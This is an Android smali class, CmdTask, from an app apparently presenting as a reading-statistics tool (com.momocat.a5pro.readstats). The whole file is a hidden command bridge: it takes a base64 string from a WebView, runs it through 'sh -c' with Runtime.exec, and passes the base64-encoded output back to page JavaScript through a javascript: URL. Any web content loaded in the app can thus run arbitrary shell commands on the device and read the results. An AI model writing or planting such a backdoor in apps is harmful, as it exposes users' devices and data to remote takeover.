.class public final Lcom/momocat/a5pro/readstats/CmdTask;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final act:Lcom/momocat/a5pro/readstats/MainActivity;
.field final web:Landroid/webkit/WebView;
.field final cmd:Ljava/lang/String;
.field stage:I
.field result:Ljava/lang/String;


# direct methods
.method public constructor <init>(Lcom/momocat/a5pro/readstats/MainActivity;Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/momocat/a5pro/readstats/CmdTask;->act:Lcom/momocat/a5pro/readstats/MainActivity;

    iput-object p2, p0, Lcom/momocat/a5pro/readstats/CmdTask;->web:Landroid/webkit/WebView;

    iput-object p3, p0, Lcom/momocat/a5pro/readstats/CmdTask;->cmd:Ljava/lang/String;

    const/4 v0, 0x0

    iput v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->stage:I

    const-string v0, ""

    iput-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->result:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    iget v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->stage:I

    if-eqz v0, :do_work

    # Second pass: on the UI thread, hand the base64 result back to JavaScript.
    iget-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->web:Landroid/webkit/WebView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "javascript:window.onCmdResult('"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/momocat/a5pro/readstats/CmdTask;->result:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "')"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    return-void

    :do_work
    const/4 v0, 0x1

    iput v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->stage:I

    :try_start_0
    iget-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->cmd:Ljava/lang/String;

    # Base64.URL_SAFE (8) | Base64.NO_WRAP (2) = 10
    const/16 v1, 0xa

    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    new-instance v1, Ljava/lang/String;

    const-string v2, "UTF-8"

    invoke-direct {v1, v0, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    # <init> returns void: move the constructed String instead of reading a result.
    move-object v0, v1

    const/4 v1, 0x3

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v3, "sh"

    aput-object v3, v1, v2

    const/4 v2, 0x1

    const-string v3, "-c"

    aput-object v3, v1, v2

    const/4 v2, 0x2

    aput-object v0, v1, v2

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v3, 0x1000

    new-array v3, v3, [B

    :read_loop
    invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I

    move-result v4

    const/4 v5, -0x1

    if-eq v4, v5, :read_done

    const/4 v5, 0x0

    invoke-virtual {v2, v3, v5, v4}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :read_loop

    :read_done
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v4

    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    const/4 v1, 0x2

    invoke-static {v0, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->result:Ljava/lang/String;

    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :handler

    :post_ui
    iget-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->act:Lcom/momocat/a5pro/readstats/MainActivity;

    invoke-virtual {v0, p0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void

    :handler
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "CMD_ERROR: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Throwable;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v1, 0x2

    invoke-static {v0, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/momocat/a5pro/readstats/CmdTask;->result:Ljava/lang/String;

    goto :post_ui
.end method
